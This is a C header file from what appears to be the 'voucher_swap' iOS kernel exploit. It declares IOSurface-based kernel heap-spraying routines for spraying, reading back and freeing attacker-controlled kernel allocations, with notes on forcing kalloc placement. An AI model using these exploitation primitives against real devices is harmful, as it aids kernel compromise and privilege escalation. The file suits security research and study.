/*
 * iosurface.h
 * Brandon Azad
 */
#ifndef VOUCHER_SWAP__IOSURFACE_H_
#define VOUCHER_SWAP__IOSURFACE_H_

#include <mach/mach.h>
#include <stdio.h>
#include <stdbool.h>
#include <stddef.h>
#include <assert.h>
#include <pthread.h>
#include <IOKit/IOKitLib.h>

#include "exploit_utilities.h"

#ifdef IOSURFACE_EXTERN
#define extern IOSURFACE_EXTERN
#endif

// The IOSurfaceRoot service.
extern mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
extern mach_port_t IOSurfaceRootUserClient;

// The ID of the IOSurface we're using.
extern uint32_t IOSurface_id;

/*
 * IOSurface_init
 *
 * Description:
 * 	Initialize the IOSurface subsystem.
 */
bool IOSurface_init(void);

/*
 * IOSurface_deinit
 *
 * Description:
 * 	Tear down the IOSurface subsystem. Any sprayed memory will be automatically deallocated.
 */
void IOSurface_deinit(void);

/*
 * IOSurface_spray_with_gc
 *
 * Description:
 * 	Spray kernel memory using IOSurface properties.
 *
 * 	The current implementation stores each data allocation in an OSString. The reason for this
 * 	is that OSString contents will be allocated using kalloc() even for allocations larger than
 * 	the page size. OSData on the other hand will use kmem_alloc() for large allocations.
 * 	Consequently, the last byte of data will be zeroed out to create a null terminator.
 */
bool IOSurface_spray_with_gc(uint32_t array_count, uint32_t array_length,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size));

/*
 * IOSurface_spray_size_with_gc
 *
 * Description:
 * 	Spray kernel memory using IOSurface properties.
 *
 * 	This function computes the number of elements per array automatically.
 */
bool IOSurface_spray_size_with_gc(uint32_t array_count, size_t spray_size,
		void *data, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size));

/*
 * IOSurface_spray_read_array
 *
 * Description:
 * 	Read back the data elements in a particular array in a particular IOSurface spray.
 */
bool IOSurface_spray_read_array(uint32_t array_id, uint32_t array_length, uint32_t data_size,
		void (^callback)(uint32_t data_id, void *data, size_t size));

/*
 * IOSurface_spray_read_all_data
 *
 * Description:
 * 	Read back all the data elements in an IOSurface spray.
 */
bool IOSurface_spray_read_all_data(uint32_t array_count, uint32_t array_length, uint32_t data_size,
		void (^callback)(uint32_t array_id, uint32_t data_id, void *data, size_t size));

/*
 * IOSurface_spray_remove_array
 *
 * Description:
 * 	Remove a particular array from an IOSurface spray, freeing the contained data elements.
 */
bool IOSurface_spray_remove_array(uint32_t array_id);

/*
 * IOSurface_spray_clear
 *
 * Description:
 * 	Remove all the arrays from an IOSurface spray, freeing all the data elements.
 */
bool IOSurface_spray_clear(uint32_t array_count);

#undef extern

#endif
